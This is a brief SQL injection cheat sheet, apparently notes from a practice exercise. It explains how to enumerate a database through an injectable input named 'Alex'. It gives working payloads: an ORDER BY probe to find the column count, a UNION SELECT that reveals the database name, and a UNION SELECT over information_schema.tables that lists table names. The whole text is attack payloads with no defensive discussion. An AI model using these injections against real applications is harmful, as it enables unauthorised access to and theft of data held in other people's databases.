Get DB table column count, DB name, DB table names

To get column count enter Alex' order by 1 -- - increasing number until you get an error. Last number without error will be column count
To get DB name Alex' union select null,null, null, database() -- -, null_count=column_count - 1
To get DB table names Alex' union select null,null, null, table_name from information_schema.tables where table_schema=database() -- -, null_count=column_count - 1
